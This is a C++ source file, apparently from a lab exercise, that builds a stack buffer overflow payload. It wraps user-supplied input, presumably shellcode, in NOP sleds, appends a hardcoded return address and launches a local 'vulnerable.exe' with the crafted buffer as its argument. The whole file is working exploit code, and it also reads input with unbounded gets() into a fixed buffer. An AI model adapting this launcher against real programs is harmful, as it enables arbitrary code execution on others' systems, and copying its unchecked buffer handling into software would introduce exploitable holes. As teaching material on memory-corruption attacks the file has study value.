// exploit.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include<cstdlib>
#include<cstring>
#include<process.h>
#include<iostream>

using namespace std;

int main(int argc, char *argv[])
{
	int nopsFront = 8;
	int nopsBack = 7;

	if(argc > 1)
	{
		nopsFront = atoi(argv[1]);
		nopsBack = atoi(argv[2]);
	}

	char input[100];
	gets(input);

	char buffer[100];

	int index = 0;
	for(index; index < nopsFront; index++)
	{
		buffer[index] = '\x90';
	}

	memcpy(buffer + index, input, strlen(input));

	index += strlen(input);

	int indexBound = index + nopsBack;
	for(index; index < indexBound; index++)
	{
		buffer[index] = '\x90';
	}

	index = indexBound;

	buffer[index] = '\x3c';
	buffer[index + 1] = '\xff';
	buffer[index + 2] = '\x12';
	buffer[index + 3] = '\x00';

	char *callVulnerable[3];
	callVulnerable[0] = "../../vulnerable/Release/vulnerable.exe";
	callVulnerable[1] = buffer;
	callVulnerable[2] = NULL;

	cout << "Ready to exploit..." << endl;

	_execve(callVulnerable[0], callVulnerable, NULL);

	cout << "Exploit complete..." << endl;

	return 0;
}

